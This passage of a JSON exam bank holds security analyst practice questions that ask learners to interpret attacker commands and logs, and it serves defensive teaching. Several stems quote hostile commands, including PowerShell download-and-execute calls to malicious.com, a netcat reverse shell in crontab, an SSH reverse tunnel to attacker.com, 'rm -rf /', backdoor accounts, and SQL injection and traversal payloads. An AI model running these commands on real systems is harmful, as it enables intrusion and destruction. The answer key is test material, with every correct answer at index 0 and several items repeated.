        "A brute-force attack against a DNS server",
        "A misconfigured DNS resolver"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware frequently generates randomized subdomains for command-and-control (C2) communication to evade detection.",
      "examTip": "Use DNS filtering and machine learning-based anomaly detection to block DGA-based threats."
    },
    {
      "id": 55,
      "question": "A forensic analyst discovers the following line in a Windows Task Scheduler configuration:\n\n`<Exec Command='C:\\Windows\\System32\\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\backdoor.ps1' />`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence via a scheduled task that runs a PowerShell backdoor",
        "Escalating privileges to SYSTEM level",
        "Disabling Windows Defender real-time protection",
        "Dumping credentials from LSASS memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The scheduled task executes a PowerShell script, ensuring persistence on the compromised machine.",
      "examTip": "Monitor scheduled tasks for unauthorized entries and restrict PowerShell execution policies."
    },
    {
      "id": 56,
      "question": "An attacker successfully compromises an Active Directory environment and executes the following command:\n\n`dcsync /user:Administrator /domain:corp.local`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Extract NTLM password hashes directly from the domain controller",
        "Create a new domain administrator account",
        "Enumerate Active Directory groups",
        "Disable security auditing on the domain controller"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dcsync` command allows an attacker to pull NTLM hashes directly from the domain controller, a critical credential theft technique.",
      "examTip": "Monitor for unauthorized `dcsync` activity and enforce tiered administrative access controls."
    },
    {
      "id": 57,
      "question": "A penetration tester runs the following Nmap command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the objective of this scan?",
      "options": [
        "Brute-forcing SNMP community strings to gain unauthorized access",
        "Enumerating RDP services on the target",
        "Scanning for SQL injection vulnerabilities",
        "Bypassing firewall rules using UDP"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide unauthorized access to network devices.",
      "examTip": "Disable SNMP if not needed, or use strong authentication mechanisms to protect against brute-force attacks."
    },
    {
      "id": 58,
      "question": "A forensic investigator is reviewing a compromised Linux system and discovers the following entry in `/etc/passwd`:\n\n`backdoor:x:0:0::/root:/bin/bash`\n\nWhat does this indicate?",
      "options": [
        "An attacker has created a backdoor root-level account",
        "A misconfigured system user with no privileges",
        "A normal administrator account",
        "A system process running in user mode"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The UID `0` and GID `0` indicate a root-level account, suggesting an attacker has created a backdoor.",
      "examTip": "Monitor `/etc/passwd` and restrict unauthorized modifications to prevent privilege escalation."
    },
    {
      "id": 59,
      "question": "An attacker attempts to bypass application authentication by modifying an HTTP request:\n\n```\nGET /login?user=admin'--&pass=1234 HTTP/1.1\n```\n\nWhat attack technique is being used?",
      "options": [
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Session fixation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The request contains `'--`, which is used to manipulate SQL queries and bypass authentication mechanisms.",
      "examTip": "Use prepared statements and input validation to prevent SQL injection attacks."
    },
    {
      "id": 60,
      "question": "A security analyst detects the following network traffic pattern:\n\n```\n08:34:12.456789 IP 192.168.1.15.54321 > 203.0.113.50.443: Flags [P.], seq 1:49, ack 100, win 512\n08:34:12.458123 IP 203.0.113.50.443 > 192.168.1.15.54321: Flags [P.], seq 100:200, ack 50, win 512\n```\n\nWhat is the MOST likely explanation?",
      "options": [
        "An encrypted command-and-control (C2) communication channel",
        "A legitimate HTTPS session",
        "A TLS handshake failure",
        "A benign software update"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Outbound connections to an unknown IP over HTTPS with consistent beaconing behavior suggest a C2 channel.",
      "examTip": "Monitor outbound HTTPS traffic for beaconing patterns and unknown destinations."
    },
    {
      "id": 61,
      "question": "A forensic investigator reviewing endpoint logs finds the following Base64-encoded PowerShell command:\n\n`cG93ZXJzaGVsbCAtbm9wIC1jICdJRVgobmV3LW9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9hdHRhY2tlci5jb20vc2NyaXB0LnBzMScpOyBzdGFydC1wcm9jZXNzICdDOlxVc2Vyc1xQdWJsaWNccGF5bG9hZC5leGUnJw==`\n\nWhat is the attacker's likely intent?",
      "options": [
        "Downloading and executing a remote payload using PowerShell",
        "Exfiltrating credentials from memory",
        "Escalating privileges to SYSTEM",
        "Scanning the network for vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals a command that downloads a script and executes a malicious payload.",
      "examTip": "Always decode Base64-encoded PowerShell commands to understand their intent before taking action."
    },
    {
      "id": 62,
      "question": "A security team detects unusual outbound traffic from a compromised endpoint:\n\n```\n08:15:32.145678 IP 192.168.1.25.54321 > 203.0.113.55.443: Flags [P.], seq 1:50, ack 150, win 1024\n08:15:32.145899 IP 203.0.113.55.443 > 192.168.1.25.54321: Flags [P.], seq 150:250, ack 50, win 1024\n```\n\nWhat does this traffic pattern MOST likely indicate?",
      "options": [
        "Command-and-control (C2) communication via HTTPS",
        "A normal system update request",
        "A brute-force attack against a remote service",
        "A vulnerability scan running on the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The outbound HTTPS traffic to an unknown external IP with consistent beaconing behavior suggests a C2 channel.",
      "examTip": "Monitor outbound HTTPS traffic for abnormal patterns and unknown destinations."
    },
    {
      "id": 63,
      "question": "An attacker successfully exploits a Linux system and executes the following command:\n\n`echo 'malicious_code' > /dev/kmem`\n\nWhat is the attacker attempting to achieve?",
      "options": [
        "Injecting a rootkit into kernel memory",
        "Modifying system logs to evade detection",
        "Exfiltrating sensitive files",
        "Manipulating network traffic rules"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Writing to `/dev/kmem` allows direct modification of kernel memory, commonly used in rootkit attacks.",
      "examTip": "Disable direct access to `/dev/kmem` and enable kernel module integrity checks."
    },
    {
      "id": 64,
      "question": "A penetration tester executes the following command on an internal network:\n\n`responder -I eth0`\n\nWhat is the purpose of this command?",
      "options": [
        "Capturing and poisoning network authentication requests",
        "Enumerating SMB shares on a Windows host",
        "Performing a brute-force attack on an SSH server",
        "Scanning the network for misconfigured firewalls"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Responder is a tool used to capture and relay authentication requests by poisoning LLMNR/NBT-NS responses.",
      "examTip": "Disable LLMNR and NBT-NS to prevent Responder-based credential theft attacks."
    },
    {
      "id": 65,
      "question": "An attacker gains access to a compromised Windows machine and executes the following command:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence by running malware at user login",
        "Disabling Windows Defender",
        "Dumping credentials from memory",
        "Modifying Active Directory group policies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 66,
      "question": "A network administrator notices that a workstation is making repeated DNS queries to domains like `abx91jz.example.com` and `zxc12ml.example.com`. What is the MOST likely explanation?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA) for command-and-control",
        "A legitimate cloud service dynamically generating subdomains",
        "A brute-force attack against a DNS server",
        "A network misconfiguration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware generates randomized subdomains to establish command-and-control communication while evading detection.",
      "examTip": "Use DNS filtering and anomaly detection to identify and block DGA-based malware."
    },
    {
      "id": 67,
      "question": "A forensic analyst is investigating a compromised system and finds the following entry in the `/etc/passwd` file:\n\n`backdoor:x:0:0::/root:/bin/bash`\n\nWhat does this indicate?",
      "options": [
        "An attacker has created a root-level backdoor account",
        "A misconfigured system user with no privileges",
        "A normal system administrator account",
        "A temporary debugging account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The UID `0` and GID `0` indicate a root-level account, suggesting an attacker has established a persistent backdoor.",
      "examTip": "Regularly audit `/etc/passwd` and `/etc/shadow` files for unauthorized modifications."
    },
    {
      "id": 68,
      "question": "An attacker successfully gains access to a Linux system and executes the following command:\n\n`(sleep 300; rm -rf /) &`\n\nWhat is the intent of this command?",
      "options": [
        "Delaying execution before deleting all files on the system",
        "Clearing system logs to cover tracks",
        "Creating a new user account",
        "Escalating privileges to root"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `sleep 300` delays execution by 5 minutes before running `rm -rf /`, which deletes all files on the system.",
      "examTip": "Monitor process execution for delayed self-destructive commands and restrict root access."
    },
    {
      "id": 69,
      "question": "A penetration tester executes the following command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the goal of this scan?",
      "options": [
        "Brute-forcing SNMP community strings to gain unauthorized access",
        "Scanning for open RDP ports",
        "Performing a denial-of-service attack",
        "Bypassing network firewall restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide access to network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 70,
      "question": "A security analyst detects repeated failed authentication attempts followed by a successful login using a privileged account. What is the MOST likely cause?",
      "options": [
        "Credential stuffing attack",
        "Kerberoasting attack",
        "Pass-the-hash attack",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using leaked credentials to gain unauthorized access, which matches the observed pattern.",
      "examTip": "Enforce multi-factor authentication (MFA) to mitigate credential stuffing attacks."
    },
    {
      "id": 71,
      "question": "A penetration tester executes the following command on a compromised Windows machine:\n\n`nltest /dclist:corp.local`\n\nWhat is the purpose of this command?",
      "options": [
        "Enumerating all domain controllers in the Active Directory environment",
        "Extracting NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Identifying all users in the domain"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nltest /dclist` command lists all domain controllers within a specified Active Directory domain.",
      "examTip": "Monitor Active Directory enumeration commands to detect potential reconnaissance activity."
    },
    {
      "id": 72,
      "question": "A security analyst reviewing logs finds the following entry:\n\n`Event ID: 4624 | Logon Type: 10 | Source IP: 203.0.113.55`\n\nWhat does this log entry indicate?",
      "options": [
        "A successful remote interactive login via RDP",
        "A failed authentication attempt",
        "A brute-force attack on an internal system",
        "A system boot event"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Logon Type `10` indicates a successful remote interactive login, commonly associated with RDP access.",
      "examTip": "Monitor remote logins from external IP addresses and enforce MFA for RDP access."
    },
    {
      "id": 73,
      "question": "A forensic analyst reviewing a Linux system finds the following process running:\n\n`/usr/bin/ssh -N -R 8080:localhost:22 attacker.com`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Creating a reverse SSH tunnel to maintain persistent access",
        "Scanning the network for open ports",
        "Dumping password hashes from memory",
        "Executing a denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command sets up an SSH reverse tunnel, allowing the attacker to access the system remotely via port 8080.",
      "examTip": "Monitor SSH sessions for unusual activity and restrict outgoing SSH connections where possible."
    },
    {
      "id": 74,
      "question": "An attacker successfully compromises a Linux server and runs the following command:\n\n`iptables -A INPUT -p tcp --dport 22 -s 203.0.113.100 -j ACCEPT`\n\nWhat is the attacker's goal?",
      "options": [
        "Allowing SSH access only from their IP for persistence",
        "Blocking all incoming SSH traffic",
        "Disabling firewall rules for external connections",
        "Redirecting SSH traffic to a different server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command modifies firewall rules to allow SSH connections only from a specific attacker-controlled IP.",
      "examTip": "Monitor firewall rule changes and restrict administrative access to firewall configurations."
    },
    {
      "id": 75,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -sS -p- --script=smb-os-discovery,smb-enum-shares <target>`\n\nWhat is the purpose of this scan?",
      "options": [
        "Identifying SMB shares and operating system details",
        "Performing a brute-force attack on SMB credentials",
        "Scanning for vulnerable FTP services",
        "Detecting SQL injection vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-os-discovery` and `smb-enum-shares` scripts enumerate SMB shares and retrieve OS details.",
      "examTip": "Disable SMBv1 and enforce authentication to prevent unauthorized enumeration."
    },
    {
      "id": 76,
      "question": "A forensic analyst finds the following command executed on a compromised Windows machine:\n\n`wmic process call create \"cmd.exe /c net user hacker P@ssw0rd123 /add\"`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Creating a new user account for persistence",
        "Dumping credentials from memory",
        "Disabling Windows Defender",
        "Clearing security logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `wmic process call create` command is being used to add a new user account for persistence.",
      "examTip": "Monitor for unauthorized account creation and enforce strict account management policies."
    },
    {
      "id": 77,
      "question": "An attacker compromises a Linux system and executes the following command:\n\n`chmod u+s /bin/bash`\n\nWhat is the impact of this command?",
      "options": [
        "Setting the SUID bit on `/bin/bash`, allowing privilege escalation",
        "Hiding malicious processes from system logs",
        "Deleting all user accounts on the system",
        "Preventing users from executing commands"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Setting the SUID bit on `/bin/bash` allows any user to execute it with root privileges, leading to privilege escalation.",
      "examTip": "Monitor file permission changes and regularly audit SUID binaries to prevent privilege escalation."
    },
    {
      "id": 78,
      "question": "A network security analyst detects a large number of outbound ICMP packets containing non-standard payload sizes. What is the MOST likely explanation?",
      "options": [
        "ICMP tunneling used for data exfiltration",
        "A routine network health check",
        "A brute-force attack on a remote SSH server",
        "A vulnerability scanner running on the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "ICMP tunneling allows attackers to exfiltrate data using ping packets with hidden payloads.",
      "examTip": "Monitor ICMP traffic for unusual patterns and restrict outbound ICMP where possible."
    },
    {
      "id": 79,
      "question": "An attacker gains access to a Windows machine and runs the following command:\n\n`wevtutil cl Security`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Clearing Windows event logs to evade detection",
        "Enumerating user accounts on the system",
        "Extracting password hashes from LSASS",
        "Disabling Windows Defender"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `wevtutil cl Security` command clears the security event logs, a common technique attackers use to cover their tracks.",
      "examTip": "Enable event log forwarding and use SIEM tools to detect log clearing attempts."
    },
    {
      "id": 80,
      "question": "A security team detects a suspicious PowerShell command execution:\n\n`powershell.exe -exec bypass -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"`\n\nWhat is the attacker's objective?",
      "options": [
        "Executing a remote PowerShell script in memory to avoid detection",
        "Dumping NTLM password hashes",
        "Escalating privileges to SYSTEM",
        "Disabling Windows security services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `IEX` (Invoke-Expression) function is downloading and executing a PowerShell script in memory, a common fileless attack.",
      "examTip": "Enable PowerShell logging and restrict execution policies to detect and prevent fileless malware."
    },
    {
      "id": 81,
      "question": "A security analyst detects the following PowerShell command in event logs:\n\n`powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"`\n\nWhat is the significance of the `-ep bypass` flag?",
      "options": [
        "Bypasses PowerShell execution policy restrictions",
        "Disables Windows Defender for the session",
        "Hides the script from system logs",
        "Forces PowerShell to run in an isolated memory space"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-ep bypass` flag allows PowerShell to execute scripts without being blocked by execution policies, commonly used in attacks.",
      "examTip": "Enforce PowerShell logging and restrict execution policies to prevent unauthorized scripts."
    },
    {
      "id": 82,
      "question": "A forensic analyst finds the following process running on a compromised Windows host:\n\n`C:\\Windows\\System32\\wbem\\wmiprvse.exe -Embedding`\n\nWhat is the MOST likely explanation?",
      "options": [
        "An attacker is using WMI for lateral movement or persistence",
        "A legitimate Windows Management Instrumentation (WMI) service",
        "A kernel-level rootkit executing system commands",
        "A misconfigured software update process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Attackers commonly use WMI (`wmiprvse.exe`) to execute remote commands, establish persistence, or move laterally.",
      "examTip": "Monitor WMI activity and restrict remote WMI execution to trusted administrators."
    },
    {
      "id": 83,
      "question": "An attacker successfully exploits a system and executes the following command:\n\n`setspn -L compromised_admin`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Enumerate service principal names (SPNs) for Kerberoasting",
        "Modify Active Directory group policies",
        "Add a new user to the domain administrator group",
        "Retrieve NTLM password hashes from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `setspn -L` command lists service principal names (SPNs), which can be used in Kerberoasting attacks to extract service account credentials.",
      "examTip": "Monitor for unexpected `setspn` commands and use strong passwords for service accounts."
    },
    {
      "id": 84,
      "question": "An attacker runs the following command on a compromised system:\n\n`schtasks /create /sc onlogon /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Persistence via a scheduled task that executes malware on user login",
        "Clearing Windows event logs",
        "Scanning the local network for open ports",
        "Performing a brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command is setting up a scheduled task that runs a malicious executable every time a user logs in.",
      "examTip": "Regularly audit scheduled tasks and remove unauthorized entries."
    },
    {
      "id": 85,
      "question": "A security analyst detects the following DNS queries originating from a compromised endpoint:\n\n```\nqwerty123.example.com\nasdfgh456.example.com\nzxcvbn789.example.com\n```\n\nWhat is the MOST likely explanation?",
      "options": [
        "Domain Generation Algorithm (DGA) malware using randomized subdomains",
        "A normal system update process",
        "A vulnerability scanner probing external hosts",
        "An NTP synchronization request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware generates random subdomains to evade detection while communicating with command-and-control servers.",
      "examTip": "Use DNS filtering and behavioral analysis to detect and block DGA-based malware."
    },
    {
      "id": 86,
      "question": "A security analyst finds the following entry in Apache logs:\n\n`192.168.1.100 - - [12/Apr/2025:14:22:15 +0000] \"GET /index.php?file=../../../../etc/passwd HTTP/1.1\" 200 5120`\n\nWhat attack is being attempted?",
      "options": [
        "Directory traversal",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The request includes `../../../../etc/passwd`, which attempts to access system files via directory traversal.",
      "examTip": "Use input validation and restrict access to sensitive directories to prevent directory traversal attacks."
    },
    {
      "id": 87,
      "question": "A forensic analyst reviewing logs finds multiple failed authentication attempts from various geographic locations, followed by a successful login. What is the MOST likely cause?",
      "options": [
        "Credential stuffing attack",
        "Kerberoasting attack",
        "Pass-the-hash attack",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using leaked credentials to gain unauthorized access, which matches the observed pattern.",
      "examTip": "Enforce multi-factor authentication (MFA) to mitigate credential stuffing attacks."
    },
    {
      "id": 88,
      "question": "A penetration tester runs the following command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the goal of this scan?",
      "options": [
        "Brute-forcing SNMP community strings to gain unauthorized access",
        "Scanning for open RDP ports",
        "Performing a denial-of-service attack",
        "Bypassing network firewall restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide access to network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 89,
      "question": "A security analyst detects suspicious outbound traffic to `hxxp://randomstring[.]xyz/cmd.php`. What is the MOST likely cause?",
      "options": [
        "A command-and-control (C2) server communication",
        "A benign DNS resolution process",
        "A routine software update request",
        "A user downloading a file from a trusted site"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The presence of `cmd.php` in a request to a randomly generated domain suggests command-and-control (C2) traffic.",
      "examTip": "Monitor outbound HTTP requests and use DNS filtering to block known malicious domains."
    },
    {
      "id": 90,
      "question": "A forensic analyst finds the following entry in a Windows Task Scheduler configuration:\n\n`<Exec Command='C:\\Windows\\System32\\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\backdoor.ps1' />`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence via a scheduled task that runs a PowerShell backdoor",
        "Escalating privileges to SYSTEM level",
        "Disabling Windows Defender real-time protection",
        "Dumping credentials from LSASS memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The scheduled task executes a PowerShell script, ensuring persistence on the compromised machine.",
      "examTip": "Monitor scheduled tasks for unauthorized entries and restrict PowerShell execution policies."
    },
    {
      "id": 91,
      "question": "A security analyst detects multiple outbound HTTP requests to `hxxp://169.254.169.254/latest/meta-data/iam/security-credentials/`. What is the attacker attempting to do?",
      "options": [
        "Steal cloud instance metadata and security credentials",
        "Exfiltrate SSH keys from the local machine",
        "Perform an SQL injection attack on a cloud database",
        "Enumerate DNS records of the cloud environment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Requests to `169.254.169.254` indicate an attempt to access cloud instance metadata, which attackers exploit to retrieve IAM credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 92,
      "question": "A penetration tester executes the following command:\n\n`nmap -p 389 --script=ldap-rootdse <target>`\n\nWhat is the purpose of this scan?",
      "options": [
        "Extracting LDAP domain information from an Active Directory server",
        "Performing a brute-force attack against LDAP user accounts",
        "Enumerating SMB shares on a domain controller",
        "Exfiltrating hashed passwords from an LDAP database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `ldap-rootdse` script retrieves domain-related information from an LDAP server, which can aid in further attacks.",
      "examTip": "Monitor LDAP queries and restrict anonymous access to sensitive directory information."
    },
    {
      "id": 93,
      "question": "An attacker executes the following command on a Linux system:\n\n`echo '*/5 * * * * root nc -e /bin/bash 192.168.1.10 4444' >> /etc/crontab`\n\nWhat is the attacker's goal?",
      "options": [
        "Establishing a persistent reverse shell every 5 minutes",
        "Executing a privilege escalation exploit",
        "Dumping password hashes",
        "Scanning for open ports on the local network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is modifying `/etc/crontab` to run a reverse shell every 5 minutes, maintaining persistence.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 94,
      "question": "A forensic analyst reviewing system logs finds the following:\n\n`Event ID: 4776 | Source Workstation: SERVER01 | Account Name: admin | Status: 0xC000006A`\n\nWhat does this log entry indicate?",
      "options": [
        "An attempted login with an incorrect password",
        "A successful Kerberos ticket request",
        "A brute-force attack against Active Directory",
        "An unauthorized modification of a security policy"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Status `0xC000006A` corresponds to a failed login due to an incorrect password.",
      "examTip": "Monitor repeated failed login attempts to detect brute-force or credential stuffing attacks."
    },
    {
      "id": 95,
      "question": "An attacker runs the following command on a compromised Linux server:\n\n`iptables -F`\n\nWhat is the result of this command?",
      "options": [
        "Flushes all firewall rules, disabling network protection",
        "Blocks all incoming connections to the server",
        "Enables logging for all traffic",
        "Creates a new firewall rule allowing SSH access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `iptables -F` command flushes all firewall rules, effectively disabling network security controls.",
      "examTip": "Monitor system logs for unexpected firewall modifications and enforce firewall persistence."
    },
    {
      "id": 96,
      "question": "A security analyst detects repeated failed authentication attempts followed by a successful login using a privileged account. What is the MOST likely cause?",
      "options": [
        "Credential stuffing attack",
        "Pass-the-hash attack",
        "Kerberoasting attack",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using leaked credentials to gain unauthorized access, which matches the observed pattern.",
      "examTip": "Enforce multi-factor authentication (MFA) to mitigate credential stuffing attacks."
    },
    {
      "id": 97,
      "question": "A penetration tester executes the following command:\n\n`rpcclient -U \"\" -N <target>`\n\nWhat is the purpose of this command?",
      "options": [
        "Enumerating SMB information without authentication",
        "Brute-forcing an SMB login",
        "Dumping NTLM password hashes",
        "Extracting Kerberos tickets from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `rpcclient -U \"\" -N` command attempts to connect to SMB without authentication to enumerate system information.",
      "examTip": "Disable null session authentication and enforce SMB signing to prevent unauthenticated access."
    },
    {
      "id": 98,
      "question": "A forensic analyst finds the following entry in a Windows Task Scheduler configuration:\n\n`<Exec Command='C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f http://malicious.com/malware.exe malware.exe' />`\n\nWhat is the attacker's goal?",
      "options": [
        "Downloading and storing a malicious file using a built-in Windows utility",
        "Disabling Windows security updates",
        "Exfiltrating encrypted data to a remote server",
        "Modifying Active Directory group policies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `certutil` command is a living-off-the-land (LotL) technique to download and execute malware without triggering antivirus alerts.",
      "examTip": "Monitor `certutil.exe` usage and restrict outbound connections from non-administrative users."
    },
    {
      "id": 99,
      "question": "A penetration tester runs the following command:\n\n`hashcat -m 1000 -a 0 hashlist.txt wordlist.txt`\n\nWhat is the tester trying to accomplish?",
      "options": [
        "Cracking NTLM password hashes using a dictionary attack",
        "Performing a pass-the-hash attack",
        "Extracting hashes from memory",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 1000` targets NTLM hashes, and `-a 0` specifies a dictionary attack using a wordlist.",
      "examTip": "Use long, complex passwords and enable account lockout policies to mitigate password cracking attempts."
    },
    {
      "id": 100,
      "question": "A security analyst reviews network traffic logs and detects multiple outbound connections to `169.254.169.254`. What is the MOST likely cause?",
      "options": [
        "An attacker attempting to exploit cloud metadata services",
        "A normal network configuration request",
        "A botnet command-and-control communication",
        "A DNS poisoning attack in progress"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    }
  ]
});
